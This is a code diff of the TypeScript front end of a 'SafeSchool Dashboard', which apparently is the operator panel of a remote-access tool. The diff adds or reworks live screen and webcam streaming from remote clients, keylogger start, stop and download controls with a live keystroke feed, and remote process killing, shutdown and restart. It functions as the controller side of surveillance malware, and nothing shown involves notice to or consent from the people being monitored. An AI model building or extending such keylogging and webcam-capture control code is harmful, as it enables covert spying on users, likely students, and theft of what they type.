@@ -7,7 +7,16 @@ interface Client {
     id: number;
     status: "online" | "offline";
     lastSeen: number;
+    name?: string;
 }
+
+interface Process {
+    pid: string;
+    name: string;
+    user: string;
+    cmd: string;
+}
+
 let clients: Map<number, Client> = new Map();
 let activeClientId: number | null = null;
 let wsClient: GatewayWsClient;
@@ -17,32 +26,36 @@ let streamingMode: "monitor" | "webcam" | null = null;
 let jmuxerScreen: any = null;
 let jmuxerWebcam: any = null;
 
+// Process Manager State
+let currentProcesses: Process[] = [];
+let processSearchTerm: string = "";
+let processAutoRefreshInterval: any = null;
+
 // --- DOM Elements ---
 const elClientList = document.getElementById("client-list")!;
-const elMainContent = document.getElementById("main-content")!;
+// const elMainContent = document.getElementById("main-content")!;
 const elViewHome = document.getElementById("view-home")!;
 const elViewClient = document.getElementById("view-client")!;
 const elHeaderClientName = document.getElementById("header-client-name")!;
 
-const btnPing = document.getElementById("btn-ping")!;
 const statusConnection = document.getElementById("status-connection")!;
-const statusLatency = document.getElementById("status-latency")!;
+// const statusLatency = document.getElementById("status-latency")!;
 
 // Client Controls
 const btnStreamScreen = document.getElementById("btn-stream-screen")!;
 const btnStreamWebcam = document.getElementById("btn-stream-webcam")!;
 const btnFullscreenScreen = document.getElementById("btn-fullscreen-screen")!;
-const btnRefreshTasks = document.getElementById("btn-refresh-tasks")!;
-// btnKill, btnShutdown, inpSearchProc are handled inside initEvents or as globals if needed
-// but let's define them here for clarity if they are top level
+
 const btnKill = document.getElementById("btn-kill")!;
 const btnShutdown = document.getElementById("btn-shutdown")!;
+const btnRestart = document.getElementById("btn-restart")!;
 const inpSearchProc = document.getElementById("inp-search-proc") as HTMLInputElement;
+const btnClearSearch = document.getElementById("btn-clear-search")!; // New button
 const elProcessListBody = document.getElementById("process-list-body")!;
 const chkSelectAll = document.getElementById("chk-select-all-procs") as HTMLInputElement;
 
 // --- Config ---
-const WS_URL = "ws://192.168.1.10:8080";
+const WS_URL = "ws://192.168.1.10:8080"; // Ideally relative or configurable
 
 // --- Initialization ---
 console.log("🚀 SafeSchool Dashboard Initializing...");
@@ -77,12 +90,14 @@ function initWebSocket() {
                 const view = new DataView(ev.payload);
                 const type = view.getUint8(0);
 
-                if (type === 0x01 || type === 0x02) {
-                    const data = new Uint8Array(ev.payload.slice(1));
-                    if (type === 0x01 && jmuxerScreen) {
-                        jmuxerScreen.feed({ video: data });
-                    } else if (type === 0x02 && jmuxerWebcam) {
-                        jmuxerWebcam.feed({ video: data });
+                // STRICT CHECK: Drop frames if mode doesn't match
+                if (type === 0x01) { // Screen
+                    if (streamingMode === "monitor" && jmuxerScreen) {
+                       jmuxerScreen.feed({ video: new Uint8Array(ev.payload.slice(1)) });
+                    }
+                } else if (type === 0x02) { // Webcam
+                    if (streamingMode === "webcam" && jmuxerWebcam) {
+                       jmuxerWebcam.feed({ video: new Uint8Array(ev.payload.slice(1)) });
                     }
                 } else if (type === 0x03) {
                     // File Download: [0x03][4B len][Name][Bytes]
@@ -171,9 +186,9 @@ function renderClientList() {
         div.innerHTML = `
             <div class="flex items-center gap-2">
                 <div class="status-indicator ${c.status}"></div>
-                <span class="font-mono font-bold">Client #${c.id}</span>
+                <span class="font-mono font-bold">${c.name ? c.name : `Client #${c.id}`}</span>
             </div>
-            <span class="text-xs text-muted">IP: 192.168.1.x</span>
+            <span class="text-xs text-muted">ID: ${c.id}</span>
         `;
         div.onclick = () => setActiveClient(c.id);
         elClientList.appendChild(div);
@@ -184,6 +199,9 @@ function setActiveClient(id: number | null) {
     activeClientId = id;
     renderClientList(); // Update active class
 
+    // Clear old interval
+    if (processAutoRefreshInterval) clearInterval(processAutoRefreshInterval);
+
     if (!id) {
         elViewHome.style.display = "flex";
         elViewClient.style.display = "none";
@@ -192,16 +210,163 @@ function setActiveClient(id: number | null) {
     }
 
     const c = clients.get(id);
-    elHeaderClientName.textContent = `Client #${id}`;
+    elHeaderClientName.textContent = c?.name || `Client #${id}`;
     elViewHome.style.display = "none";
     elViewClient.style.display = "grid";
 
-    // Reset streams when switching
+    // Stop previous streams
     if (streamingMode) stopCurrentStream();
+
+    // Start Auto-Refresh (5s)
+    refreshProcessList(); // Initial fetch
+    processAutoRefreshInterval = setInterval(() => refreshProcessList(), 5000);
+}
+
+function stopCurrentStream() {
+    if (activeClientId && streamingMode === "monitor") {
+        wsClient.sendText(activeClientId, "stop_monitor_stream");
+    } else if (activeClientId && streamingMode === "webcam") {
+        wsClient.sendText(activeClientId, "stop_webcam_stream");
+    }
+
+    // Force clear buffered frames by mode
+    if (streamingMode === "monitor" && jmuxerScreen) {
+         jmuxerScreen.reset();
+         jmuxerScreen.feed({ video: new Uint8Array(0) });
+    }
+    if (streamingMode === "webcam" && jmuxerWebcam) {
+         jmuxerWebcam.reset();
+         jmuxerWebcam.feed({ video: new Uint8Array(0) });
+    }
+
+    streamingMode = null;
+    btnStreamScreen.textContent = "Start Stream";
+    btnStreamScreen.classList.remove("btn-destructive");
+    btnStreamWebcam.textContent = "Start Cam";
+    btnStreamWebcam.classList.remove("btn-destructive");
+}
+
+function handleBackendText(id: number, text: string) {
+    if (id !== activeClientId) return;
+
+    // Keylogger Data
+    if (text.startsWith("KEYLOG: ")) {
+        const char = text.substring(8);
+        const feed = document.getElementById("keylog-feed");
+        if (feed) {
+            feed.innerText += char;
+            feed.scrollTop = feed.scrollHeight;
+        }
+    }
+    // Process List response
+    else if (text.includes("PID") && text.includes("NAME")) { // Header check
+        console.log("✅ Received Process List response");
+        parseProcessList(text);
+    }
+    // Command feedback
+    else if (text.startsWith("OK:")) {
+        console.log("Success:", text);
+        const msg = text.substring(4);
+        alert("✅ Success: " + msg);
+        const status = document.getElementById("status-message");
+        if(status) status.textContent = "Last Action: " + msg;
+    }
+    else if (text.startsWith("INFO: NAME=")) {
+        const name = text.substring(11).trim();
+        const c = clients.get(id);
+        if (c) {
+            c.name = name;
+            renderClientList();
+            if (activeClientId === id) elHeaderClientName.textContent = name;
+        }
+    }
+    else if (text.startsWith("ERROR:")) {
+        alert("❌ " + text);
+    }
+}
+
+// --- Process Manager Logic ---
+
+function refreshProcessList() {
+    if (activeClientId) wsClient.sendText(activeClientId, "list_process");
+}
+
+function parseProcessList(raw: string) {
+    const lines = raw.split("\n").slice(1);
+    currentProcesses = [];
+
+    lines.forEach(line => {
+        if (!line.trim()) return;
+        const parts = line.trim().split(/\s+/);
+        // Format: PID NAME USER CMD
+        const pid = parts[0];
+        const name = parts[1];
+        const user = parts[2];
+        const cmd = parts.slice(3).join(" ");
+
+        currentProcesses.push({ pid, name, user, cmd });
+    });
+
+    renderProcessList();
+}
+
+function renderProcessList() {
+    elProcessListBody.innerHTML = "";
+
+    // Filter
+    const filtered = currentProcesses.filter(p => {
+        if (!processSearchTerm) return true;
+        const term = processSearchTerm.toLowerCase();
+        return p.name.toLowerCase().includes(term) ||
+               p.pid.includes(term) ||
+               p.cmd.toLowerCase().includes(term);
+    });
+
+    const fragment = document.createDocumentFragment();
+
+    filtered.forEach(p => {
+        const displayCmd = p.cmd || p.name;
+        const tr = document.createElement("tr");
+        tr.innerHTML = `
+            <td><input type="checkbox" class="chk-proc-row" data-pid="${p.pid}"></td>
+            <td>${p.pid}</td>
+            <td class="text-primary truncate" style="max-width: 200px;" title="${displayCmd}">${p.name}</td>
+            <td>${p.user}</td>
+            <td><button class="btn btn-sm btn-destructive btn-kill-proc" data-pid="${p.pid}">Kill</button></td>
+        `;
+        fragment.appendChild(tr);
+    });
+
+    elProcessListBody.appendChild(fragment);
+}
+
+// Debounce Utility
+function debounce(func: Function, wait: number) {
+    let timeout: any;
+    return function (...args: any) {
+        clearTimeout(timeout);
+        timeout = setTimeout(() => func(...args), wait);
+    };
 }
 
 function initEvents() {
-    btnPing.onclick = () => discoverBackends();
+    // Theme Toggle
+    const btnThemeToggle = document.getElementById("btn-theme-toggle")!;
+
+    // Init Theme
+    const savedTheme = localStorage.getItem("theme") || "dark";
+    document.documentElement.setAttribute("data-theme", savedTheme);
+    btnThemeToggle.textContent = savedTheme === "dark" ? "🌙" : "☀️";
+
+    btnThemeToggle.onclick = () => {
+        const current = document.documentElement.getAttribute("data-theme");
+        const next = current === "light" ? "dark" : "light";
+        document.documentElement.setAttribute("data-theme", next);
+        localStorage.setItem("theme", next);
+        btnThemeToggle.textContent = next === "dark" ? "🌙" : "☀️";
+    };
+
+    // Auto-ping removed from manual button, but discoverBackends loop still runs.
 
     // Recording Buttons
     const btnRecordScreen = document.getElementById("btn-record-screen")!;
@@ -216,31 +381,6 @@ function initEvents() {
                 btnRecordScreen.textContent = "Rec (10s)";
                 btnRecordScreen.removeAttribute("disabled");
             }, 10000);
-        }
-    };
-
-    // Keylogger Toggle
-    const btnKeylogToggle = document.getElementById("btn-keylog-toggle")!;
-    let isKeylogging = false;
-    btnKeylogToggle.onclick = () => {
-        if (!activeClientId) {
-            console.warn("Keylogger: No active client selected.");
-            return;
-        }
-        console.log("Keylogger button clicked. State:", isKeylogging, "ActiveClient:", activeClientId);
-
-        if (!isKeylogging) {
-            console.log("Sending: start_keylog");
-            wsClient.sendText(activeClientId, "start_keylog");
-            btnKeylogToggle.textContent = "Disable Keylogger";
-            btnKeylogToggle.classList.add("btn-destructive");
-            isKeylogging = true;
-        } else {
-            console.log("Sending: stop_keylog");
-            wsClient.sendText(activeClientId, "stop_keylog");
-            btnKeylogToggle.textContent = "Enable Keylogger";
-            btnKeylogToggle.classList.remove("btn-destructive");
-            isKeylogging = false;
         }
     };
 
@@ -289,47 +429,82 @@ function initEvents() {
         }
     };
 
-    btnRefreshTasks.onclick = () => {
-        if (activeClientId) {
-            console.log("Refreshing process list for client", activeClientId);
-            const originalText = btnRefreshTasks.textContent;
-            btnRefreshTasks.textContent = "Refreshing...";
-            btnRefreshTasks.setAttribute("disabled", "true");
+    // Keylogger
+    const btnKeylogToggle = document.getElementById("btn-keylog-toggle")!;
+    const btnKeylogDownload = document.getElementById("btn-keylog-download")!; // Add this
+    const elKeylogStatus = document.getElementById("keylog-status")!;
+    const elKeylogFeed = document.getElementById("keylog-feed")!;
 
-            wsClient.sendText(activeClientId, "list_process");
+    let isKeylogging = false;
 
-            // Revert after 1s (or ideally after response, but simple timeout works for feedback)
-            setTimeout(() => {
-                btnRefreshTasks.textContent = originalText;
-                btnRefreshTasks.removeAttribute("disabled");
-            }, 1000);
+    // Download
+    btnKeylogDownload.onclick = () => {
+        if (!activeClientId) return;
+        wsClient.sendText(activeClientId, "get_keylog");
+    };
+
+    btnKeylogToggle.onclick = () => {
+        if (!activeClientId) return;
+        if (!isKeylogging) {
+            wsClient.sendText(activeClientId, "start_keylog");
+            btnKeylogToggle.textContent = "Disable Keylogger";
+            btnKeylogToggle.classList.add("btn-destructive");
+
+            // Enable Download Button
+            btnKeylogDownload.removeAttribute("disabled");
+            elKeylogStatus.textContent = "Recording...";
+            elKeylogStatus.style.color = "var(--neon-green)";
+
+            isKeylogging = true;
         } else {
-            console.warn("Cannot refresh: No active client selected");
+            wsClient.sendText(activeClientId, "stop_keylog");
+            btnKeylogToggle.textContent = "Enable Keylogger";
+            btnKeylogToggle.classList.remove("btn-destructive");
+
+            elKeylogStatus.textContent = "Stopped";
+            elKeylogStatus.style.color = "var(--muted)";
+
+            isKeylogging = false;
         }
     };
 
-    // Process Search Feedback
-    inpSearchProc.addEventListener("input", () => {
-        const term = inpSearchProc.value.toLowerCase();
-        const rows = document.querySelectorAll("#process-list-body tr");
-        if (term) {
+    // --- Search & Process ---
+
+    const handleSearch = debounce(() => {
+        processSearchTerm = inpSearchProc.value.toLowerCase().trim();
+        renderProcessList();
+
+        // Toggle Clear Button
+        if (processSearchTerm) {
+            btnClearSearch.style.display = "block";
             inpSearchProc.style.border = "1px solid var(--neon-cyan)";
             inpSearchProc.style.boxShadow = "0 0 5px var(--neon-cyan)";
         } else {
+            btnClearSearch.style.display = "none";
             inpSearchProc.style.border = "";
             inpSearchProc.style.boxShadow = "";
         }
-        rows.forEach((row: any) => {
-            const text = row.innerText.toLowerCase();
-            row.style.display = text.includes(term) ? "" : "none";
-        });
-    });
+    }, 300);
+
+    inpSearchProc.addEventListener("input", handleSearch);
+
+    // Clear Button Logic
+    btnClearSearch.onclick = () => {
+        inpSearchProc.value = "";
+        processSearchTerm = "";
+        renderProcessList();
+        btnClearSearch.style.display = "none";
+        inpSearchProc.style.border = "";
+        inpSearchProc.style.boxShadow = "";
+        inpSearchProc.focus();
+    };
 
     // Select All
     chkSelectAll.onchange = () => {
         const checkboxes = document.querySelectorAll(".chk-proc-row") as NodeListOf<HTMLInputElement>;
         checkboxes.forEach(kb => {
-            if (kb.closest("tr")?.style.display !== "none") {
+            // Only select visible rows
+            if (kb.closest("tr")?.isConnected) {
                 kb.checked = chkSelectAll.checked;
             }
         });
@@ -346,22 +521,21 @@ function initEvents() {
                 const pid = kb.getAttribute("data-pid");
                 if (pid) wsClient.sendText(activeClientId!, `kill_process ${pid}`);
             });
-            setTimeout(() => wsClient.sendText(activeClientId!, "list_process"), 1000);
+            setTimeout(() => refreshProcessList(), 1000);
         }
     };
 
     // Process List Delegation (Kill Button)
     elProcessListBody.addEventListener("click", (e) => {
         const target = e.target as HTMLElement;
-        const btn = target.closest(".btn-kill-proc"); // Safer than classList check
+        const btn = target.closest(".btn-kill-proc");
 
         if (btn) {
             const pid = btn.getAttribute("data-pid");
             if (pid && activeClientId) {
                 if (confirm(`Are you sure you want to KILL process ${pid}?`)) {
                     wsClient.sendText(activeClientId, `kill_process ${pid}`);
-                    // Optimistic UI update could happen here, but wait for list refresh is safer
-                    setTimeout(() => wsClient.sendText(activeClientId!, "list_process"), 500);
+                    setTimeout(() => refreshProcessList(), 500);
                 }
             }
         }
@@ -374,76 +548,11 @@ function initEvents() {
         }
     };
 
-    // ... [Keylogger Toggle code remains same] ...
+    // Client Restart
+    btnRestart.onclick = () => {
+        if (activeClientId && confirm(`Are you sure you want to RESTART Client #${activeClientId}?`)) {
+            wsClient.sendText(activeClientId, "restart");
+        }
+    };
 }
-
-function stopCurrentStream() {
-    // ... [remains same] ...
-    streamingMode = null;
-    btnStreamScreen.textContent = "Start Stream";
-    btnStreamScreen.classList.remove("btn-destructive");
-    btnStreamWebcam.textContent = "Start Cam";
-    btnStreamWebcam.classList.remove("btn-destructive");
-    jmuxerScreen?.reset();
-    jmuxerWebcam?.reset();
-}
-
-function handleBackendText(id: number, text: string) {
-    if (id !== activeClientId) return;
-
-    // console.log("Received text:", text.substring(0, 50) + "..."); // Debug log
-
-    // Keylogger Data
-    if (text.startsWith("KEYLOG: ")) {
-        const char = text.substring(8);
-        const feed = document.getElementById("keylog-feed")!;
-        feed.innerText += char;
-        feed.scrollTop = feed.scrollHeight;
-    }
-    // Process List response
-    else if (text.includes("PID") && text.includes("NAME")) { // Header check
-        console.log("✅ Received Process List response");
-        parseProcessList(text);
-    }
-    // Command feedback
-    else if (text.startsWith("OK:")) {
-        console.log("Success:", text);
-        // Visual feedback for user
-        const msg = text.substring(4);
-        alert("✅ Success: " + msg);
-        // Or clearer status update
-        const status = document.getElementById("status-message");
-        if(status) status.textContent = "Last Action: " + msg;
-    }
-    else if (text.startsWith("ERROR:")) {
-        alert("❌ " + text);
-    }
-}
-
-function parseProcessList(raw: string) {
-    elProcessListBody.innerHTML = "";
-    const lines = raw.split("\n").slice(1);
-    lines.forEach(line => {
-        if (!line.trim()) return;
-        const parts = line.trim().split(/\s+/);
-
-        // Format: PID NAME USER CMD
-        const pid = parts[0];
-        const name = parts[1];
-        const user = parts[2];
-        const cmd = parts.slice(3).join(" ");
-
-        // If cmd is empty (rare), use name
-        const displayCmd = cmd || name;
-
-        const tr = document.createElement("tr");
-        tr.innerHTML = `
-            <td><input type="checkbox" class="chk-proc-row" data-pid="${pid}"></td>
-            <td>${pid}</td>
-            <td class="text-primary truncate" style="max-width: 200px;" title="${displayCmd}">${name}</td>
-            <td>${user}</td>
-            <td><button class="btn btn-sm btn-destructive btn-kill-proc" data-pid="${pid}">Kill</button></td>
-        `;
-        elProcessListBody.appendChild(tr);
-    });
-}
+// End of file
